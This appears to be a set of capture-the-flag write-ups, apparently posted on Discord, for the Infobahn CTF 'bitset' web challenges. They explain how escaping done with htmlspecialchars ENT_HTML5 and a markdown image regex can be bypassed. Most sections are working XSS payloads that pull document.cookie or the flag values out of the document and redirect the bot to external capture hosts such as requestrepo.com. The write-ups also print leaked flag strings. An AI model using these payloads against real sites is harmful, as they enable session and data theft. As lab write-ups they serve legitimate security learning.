# bitset(s(y)) unintended
Since bun automatically serves the current directory, you can simply do this. Thanks to <@430403469233618944> for discovering this
```sh
❯ curl https://bitset-web.challs.infobahnc.tf/run.sh
#!/bin/bash

cd /app || exit
export FLAG1='infobahn{1eT5_seE_whO_rE4Ds_th3_Php_docs}'
export FLAG2='infobahn{d1d_YOU_fINd_oUt_THI5_P4y10@D_From_por75wiG6Er}'
export FLAG3='infobahn{C0NgR@tS_you_aR3_A_SEnior_1n73Rn_IN_BEGInNeR}'
bun /app/server.js
```
# bitset-revenge

```html
htmlspecialchars('![ ](' . $s . ')', ENT_HTML5, 'UTF-8')
```

ENT_HTML5 doesn't escape ' or ", you can still use those.
Since ) means the end of the markdown, you can use location to avoid parentheses
```
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://'%20onerror='location=`//e4zy20y7.requestrepo.com/?${document.cookie}`
```
# bitsets-revenge

You can solve this by reading [portswigger cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

The idea is that you could use `JSON.stringify(document)` to dump the flag and use `Function` to xss without parentheses, note that means 3 backticks, I had to add a \ because of discord formatting

```
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://' onerror="location=`//lp2drty9.requestrepo.com/`+Function`return JSON.stringify(document\u0029``\`"
```
# bitsetsy-revenge

The idea is to use the `location.hash`, you can do the following steps:
1. Make the bot visit your website using location
2. In your website and redirect it back to `127.0.0.1:6969`
3. The bot parses the url within the length limit and execute the payload after the #

Put in the response of `lp2drty9.requestrepo.com`:

```html
<script>
location = "http://127.0.0.1:6969/?url=http://'+onerror='Function`eval(location.hash.substr(1%5cx29%5cx29``\`#location='//e4zy20y7.requestrepo.com/?'+JSON.stringify(document).slice(-100)"
</script>
```

Then send this payload
```
https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=http://'+onerror='location=`//lp2drty9.requestrepo.com`
```

Note: I should've checked the url length inside index.php



# bitset(bitset-revenge)
Since FLAG1 is in a cookie, javascript needs to be executed.
Since the input is embedded directly in the <img src=>, inserting `'` escapes the src and allows you to freely set onerror, onload, etc.
This allows you to set an invalid src and execute javascript via onerror.
At first glance, the fetch api will not work properly as it is terminated with `)` due to the `preg_replace` in `render_img_markdown`, which results in invalid syntax.
Therefore, this time we need to send the cookie in a different way.
This time, the cookie is sent without using `)` by setting the location to a url.

```http://localhost:1919/bot?url=https://a.com/a' onerror="location=`https://singetu0096.requestcatcher.com/?flag=${document.cookie}`"
```

# bitsets(bitsets-revenge)
If the URL is 111 characters or less, FLAG2 is stored in a random key starting with `flag` in the document.
I couldn't think of a way to obtain this without using `)`, so I somehow managed to make it possible to use `)`.
`preg_replace` replaces strings that match a regular expression, but leaves strings that do not. If you intentionally enter `)` like ```http://)aaaa```, the string to be replaced will be ```![ ](http://)aaaa)```. In this case, `preg_replace` captures the parts from `![ ](` to `)` and replaces them with an img tag. Therefore, the replaced string will be ```<img src='http://' loading='lazy'>aaaa)```, and the characters after the first `)` will remain outside the img tag. In other words, the string before and after the first `)` will be divided into inside and outside the img tag.
To execute JavaScript, you need to put `onerror` inside the image tag. However, executing a function like `onerror="alert(1)"` results in `onerror="alert(1` and `)"` splitting it into `onerror="` and `alert(1)"`, which is invalid syntax. Therefore, by using `onerror=")alert(1)"`, you can split it into `onerror="` and `alert(1)"`. The `' loading='lazy'>` in between is enclosed in `""`, so it will be interpreted as the onerror JavaScript. Of course, this is invalid syntax as is, so you can ignore this garbage by enclosing it between `onerror="/*` and `*/alert(1)"`. Using these, you can create the following payload:
```http://'onerror="/*)*/alert(1)"```
Now you can call any function using `()`. All that's left is to get FLAG2, which is stored in the document at a random key starting with "flag". The final payload will look like this:
```
http://localhost:1919/bot?url=http://'onerror="/*)*/for(k in document)if(k.startsWith`fl`)location=`//h.requestcatcher.com/${document[k]}`"
```


# bitsety(bitsety-revenge)
FLAG3 is stored in a random key starting with `flag` in the document if the URL is 55 characters or less. In this case, the URL is too long for a payload like FLAG2. I considered using a shortened URL to load external JavaScript with `import()`, but this was not possible because `Access-Control-Allow-Origin` was not returned properly.
Since this problem only checks the length of the initial URL passed, I use a shortened URL such as ```location=`//x.gd/XXXXX``` to shorten the initial URL and direct the bot to requestrepo.com. FLAG3 can be obtained by accessing `127.0.0.1:6969` on requestrepo.com using the FLAG2 payload as shown below.
```
<script>
location='http://127.0.0.1:6969/?url=http://%27onerror="/*)*/for(k in document)if(k.startsWith`fl`)location=`//h.requestcatcher.com/${document[k]}`"'
</script>
```
FLAG3 is set by `evaluateOnNewDocument` only when `location.hostname == "127.0.0.1"`, so the path is redirected to `127.0.0.1:6969`.